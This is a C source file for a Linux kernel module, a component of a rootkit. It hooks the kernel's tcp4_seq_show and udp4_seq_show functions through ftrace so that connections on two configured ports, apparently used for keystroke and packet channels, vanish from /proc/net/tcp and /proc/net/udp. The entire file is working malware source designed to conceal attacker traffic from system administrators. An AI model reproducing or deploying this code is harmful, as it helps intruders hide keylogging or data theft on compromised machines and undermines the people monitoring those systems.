#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include "ftrace_helper.h"
#include "ports.h"
#include "port_hiding.h"

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short keys_port = htons(UDP_KEYS_DEST);
    unsigned short packets_port = htons(UDP_PACKETS_DEST);

    if (v != SEQ_START_TOKEN)
    {
        is = (struct inet_sock *)v;

        if (keys_port == is->inet_sport || keys_port == is->inet_dport || packets_port == is->inet_sport || packets_port == is->inet_dport)

        {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
                   ntohs(is->inet_sport), ntohs(is->inet_dport));

            // drop from /proc/net/udp 
            return 0;

        }
    }

    ret = orig_udp4_seq_show(seq, v);
    return ret;
}
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short keys_port = htons(UDP_KEYS_DEST);
    unsigned short packets_port = htons(UDP_PACKETS_DEST);

    if (v != SEQ_START_TOKEN)
    {
        is = (struct inet_sock *)v;

        if (keys_port == is->inet_sport || keys_port == is->inet_dport || packets_port == is->inet_sport || packets_port == is->inet_dport)

        {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
                   ntohs(is->inet_sport), ntohs(is->inet_dport));

            // drop from /proc/net/tcp
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}
struct ftrace_hook port_hooks[] = {
HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};
